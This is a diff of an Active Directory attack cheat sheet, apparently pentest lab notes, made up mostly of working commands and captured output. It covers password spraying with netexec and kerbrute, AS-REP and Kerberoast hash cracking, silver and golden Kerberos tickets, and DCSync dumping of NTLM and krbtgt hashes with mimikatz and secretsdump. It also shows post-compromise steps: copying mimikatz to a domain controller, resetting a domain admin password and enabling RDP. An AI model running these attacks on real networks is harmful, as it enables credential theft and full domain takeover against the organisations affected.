@@ -19,7 +19,7 @@ Scenario:
 * **Limitation**: Requires Windows NTLM has been stolen
 * Use mimikatz module [sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
 * Run sekurlsa::pth to insert NTLM into the windows memory
-* Run sekurlsa::ekeys to elimiminate all HTLM hashes
+* Run sekurlsa::ekeys to elimiminate all NTLM hashes
 * Connect via SMB to create Kerberos Ticket
 * List Kerberos Tickets
 * From [Duckwall-Abusing-Microsoft-Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
@@ -132,7 +132,7 @@ Features
 * Options
 * -Pass Allows to provide a password
 * -File Allows to provide a wordlist
-* -Admin Tests for admin accounts too
+* -Admin Tests for **Admin Credentials**
 
 ```powershell
 cd tools
@@ -140,32 +140,23 @@ powershell -ep bypass
 .\Spray-Passwords.ps1 -Pass 'Secr3t' -Admin
 ```
 
-## AD Password Spraying with Kerbrute
+## AD Password Spray with NXC (netexec)
 
-Feature
-
-* Download [kerbrute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
-* Cross-platform for Linux and Windows and Mac
-* bruteuser - Bruteforce a single user's password from a wordlist
-* bruteforce - Read username:password combos from a file or stdin and test them
-* userenum - Enumerate valid domain usernames via Kerberos
-* passwordspray - Test a single password against a list of users
+* NetExec (a.k.a nxc) is the successor a network service exploitation tool crackmapexec
+* From: [NetExec Wiki](https://www.netexec.wiki/getting-started/target-formats)
+* Modules ftp,ssh,smb,nfs,winrm,mssql,wmi,vnc,ldap,rdp
+* [+]  **User credendential**
+* [+] (Pwn3d!) **Admin Credentials**
 
 ```bash
-cd tools
-.\kerbrute_windows_amd64.exe userenum -d corp.com .\usernames.txt
+# IP Range
+nxc smb 192.168.207.70-75 -u 'mary'  -p 'Nexus123!' -d example.com --no-bruteforce --continue-on-success
 
-2025/09/26 08:54:44 >   dc1.corp.com:88
-2025/09/26 08:54:44 >  [+] VALID USERNAME:       jeff@corp.com
-2025/09/26 08:54:44 >  [+] VALID USERNAME:       dave@corp.com
+SMB         192.168.207.70  3389   DC1              [+] corp.com\pete:Nexus123! 
+SMB         192.168.207.72  3389   WEB02            [+] corp.com\pete:Nexus123! (Pwn3d!)
+SMB         192.168.207.74  3389   CLIENT4          [+] corp.com\pete:Nexus123! 
 
-.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
-
-2025/09/26 08:56:56 >   dc1.corp.com:88
-2025/09/26 08:56:56 >  [+] VALID LOGIN:  jeff@corp.com:Nexus123!
 ```
-
-The **wordlist usernames.txt MUST be ANSI encoded**. Otherwise you get a network error.
 
 ## AD Password Spraying with CrackMap
 
@@ -185,6 +176,43 @@ SMB         192.168.226.75  445    CLIENT75         [-] corp.com\mary:Secr3t! ST
 
 ```
 
+## AD Password Spraying with Kerbrute (ASP-REP)
+
+Feature
+
+* Download [kerbrute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
+* Cross-platform for Linux and Windows and Mac
+* bruteuser - Bruteforce a single user's password from a wordlist
+* bruteforce - Read username:password combos from a file or stdin and test them
+* userenum - Enumerate valid domain usernames via Kerberos
+* passwordspray - Test a single password against a list of users
+
+Windows
+
+```powershell
+cd tools
+.\kerbrute_windows_amd64.exe userenum -d corp.com .\usernames.txt
+
+2025/09/26 08:54:44 >   dc1.corp.com:88
+2025/09/26 08:54:44 >  [+] VALID USERNAME:       jeff@corp.com
+2025/09/26 08:54:44 >  [+] VALID USERNAME:       dave@corp.com
+
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+2025/09/26 08:56:56 >   dc1.corp.com:88
+2025/09/26 08:56:56 >  [+] VALID LOGIN:  jeff@corp.com:Nexus123!
+```
+
+Kali (cross platform)
+
+```shell
+cd tools
+./kerbrute_linux_386 userenum -d corp.com .\usernames.txt
+./kerbrute_linux_386 passwordspray -d corp.com .\usernames.txt "Nexus123!"s
+```
+
+The **wordlist usernames.txt MUST be ANSI encoded**. Otherwise you get a network error.
+
 ## AD Cracking Kerberos User Password with AS-REP Roasting (Crack-the-Hash for Users)
 
 Scenario
@@ -192,7 +220,7 @@ Scenario
 * **Limitation**: AD Kerberos option Pre-Auth is DISABLED
 * **Requires**: Valid domain user credentials like passwd
 * Retrieve kerberos user password hash
-* Crask the hash with HashCat
+* Crack the hash with HashCat
 * From [Cracking Active Directory Passwords with AS-REP Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)
 
 Attack with Windows
@@ -221,7 +249,13 @@ Get-DomainUser -Identity TargetUser | Select-Object samaccountname, useraccountc
 
 [*] AS-REP hash:
 
-      $krb5asrep$mimi@example.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+      $krb5asrep$mimi@example.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB9725...1DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+
+# IMPORTANT: Add the $23 before the domain user to make it compatible with hashcat
+cat asreproast.hashes
+
+      $krb5asrep$23$mimi@example.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+
 ```
 
 Attack with Kali
@@ -247,7 +281,7 @@ hashcat -hh | grep -E "(Kerberos|AS-REP)"
 sudo hashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
 ```
 
-## AD Cracking Kerberos Service Password with TGS-REP Kerberoasing (Crask-the-hash for SPNs)
+## AD Cracking Kerberos Service Password with TGS-REP Kerberoasing (Crack-the-hash for SPNs)
 
 Scenario:
 
@@ -309,7 +343,7 @@ Sitation:
   * Target SPN
 * From: [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)
 
-We need to provide the **domain SID** (/sid:), domain name (/domain:), and the **target where the SPN** runs (/target:). We also need to include the **SPN protocol** (/service:), **NTLM hash of the Tartget service SPN** (/rc4:), and the /ptt option, which allows us to **inject the forged ticket into the memory** of the machine we execute the command on. Finally, we must enter **any existing domain user** for /user:. This user will be set in the forged ticket. 
+We need to provide the **domain SID** (/sid:), domain name (/domain:), and the **target where the SPN** runs (/target:). We also need to include the **SPN protocol** (/service:), **NTLM hash of the Tartget service SPN** (/rc4:), and the /ptt option, which allows us to **inject the forged ticket into the memory** of the machine we execute the command on. Finally, we must enter **any existing domain user** for /user:. This user will be set in the forged ticket.
 
 ```powershell
 # Get SPN password hash
@@ -386,4 +420,131 @@ Cached Tickets: (1)
 
 # User the silver ticket to access the service
 Invoke-WebRequest -UseDefaultCredentials http://web01
+```
+
+
+## AD Sync Update Attack to dump NTLM hash of domain users
+
+Situation
+
+* **Limitation:** Attacker has access to members of Domain Admins, Enterprise Admins, and Administrators groups
+* **Requires:** Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set permission
+* Run mimikatz `lsadump::dcsync` to dump NTML of any domain user from within the domain (Windows)
+* Run `impacket-secretsdump` to dump NTML hash of any user domain from outside of the domain (Linux)
+
+```powershell
+mimikatz#
+privilege::debug
+token::inpersonate
+...
+lsadump::dcsync /user:corp.com\Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 9:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1199
+Object Relative ID   : 1199
+
+Credentials:
+    Hash NTLM: 08d7a47c6f9f66b98b1bae4178747494
+```
+
+```bash
+impacket-secretsdump -just-dc-user Administrator example.com/user:"password\!"@192.168.1.1
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47c6f9f66b98b1bae4178747494:::
+```
+
+Crack the hash or alternatively pass-the-hash
+
+```bash
+hashcat -m 1000 dcsync.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+## AD Kerberos Golden Ticket
+
+Scenario
+
+* **Requires**: 
+* Use **mimikatz** to create a kerberos golden ticket
+* from: [Golden Ticket](https://netwrix.com/en/resources/blog/complete-domain-compromise-with-golden-tickets//)
+
+Attacker
+
+```shell
+impacket-secretsdump -just-dc-user krbtgt example.com/user:"password\!"@192.168.1.1
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
+krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
+krbtgt:des-cbc-md5:683bdcba9e7c5de9
+```
+
+AD Victim
+
+```powershell
+mimikatz # 
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:example.com /ptt /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /user:Administrator /ticket:Administrator.kirbi
+
+User      : Administrator
+Domain    : example.com (EXAMPLE)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
+Lifetime  : 10/24/2025 6:32:08 AM ; 10/22/2035 6:32:08 AM ; 10/22/2035 6:32:08 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ example.com' successfully submitted for current session
+
+mimikatz # kerberos::tgt
+Kerberos TGT of current session :
+           Start/End/MaxRenew: 10/24/2025 6:35:48 AM ; 10/22/2035 6:35:48 AM ; 10/22/2035 6:35:48 AM
+           Service Name (02) : krbtgt ; example.com ; @ example.com
+
+mimikatz # exit
+Bye!
+
+# DC Connect via SMB
+PS C:\tools> net use i: \\dc.example.com\c$
+PS C:\tools> copy .\mimikatz.exe \\dc.example.com\c$
+
+# DC Connect via PSExec
+PS C:\tools> .\PSExec.exe \\dc.example.com cmd
+net user domainadmin "newPassword1" /domain
+net localgroup "Remote Desktop Users" CORP\domainadmin /add
+
+# DC Connect via RDP
+xfreerdp3 +clipboard /cert:ignore /d:corp.com /u:jeffadmin /v:192.168.140.70 /p:'newPassword1'
+
+# AD Connect to any domain computer using restrict admin mode
+PS C:\tools> .\PSExec.exe \\web01.example.com powershell
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+# AD Connect without password using the DC credentials (if allowed?)
+mstsc.exe /restrictedadmin
+ else
+mstsc.exe
+
+
 ```
